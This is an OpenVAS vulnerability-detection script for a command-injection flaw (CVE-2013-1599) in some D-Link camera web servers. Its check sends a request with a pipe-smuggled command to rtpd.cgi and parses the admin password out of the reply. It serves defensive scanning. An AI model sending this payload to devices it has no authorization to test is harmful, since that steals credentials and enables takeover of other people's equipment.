###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_multiple_dlink_59564.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# Multiple D-Link Products Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2014 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105104");
  script_bugtraq_id(59564);
  script_cve_id("CVE-2013-1599");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_version("$Revision: 11867 $");

  script_name("Multiple D-Link Products Command Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/59564");
  script_xref(name:"URL", value:"http://www.dlink.com/");

  script_tag(name:"impact", value:"Exploiting this issue could allow an attacker to execute arbitrary
commands in the context of the affected device.");

  script_tag(name:"vuldetect", value:"Send a HTTP GET request and check the response.");
  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"Multiple D-Link products are prone to a command-injection
vulnerability.");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-11-04 13:38:34 +0100 (Tue, 04 Nov 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("dcs-lig-httpd/banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:8080 );

banner = get_http_banner( port:port );
if( ! banner || "Server: dcs-lig-httpd" >!< banner ) exit( 0 );

url = '/cgi-bin/rtpd.cgi?echo&AdminPasswd_ss|tdb&get&HTTPAccount';

if( buf = http_vuln_check( port:port, url:url, pattern:"AdminPasswd_ss=" ) )
{
  password = eregmatch( pattern:'AdminPasswd_ss="([^"]+)"', string:buf );
  if( ! isnull( password[ 1 ] ) )
  {
    report = 'By requesting the URL "' + url + '" it was possible to retrieve the Admin password "' + password[ 1 ] + '"\n';
  }
  security_message( port:port, data:report );
  exit(0);

}

exit( 99 );

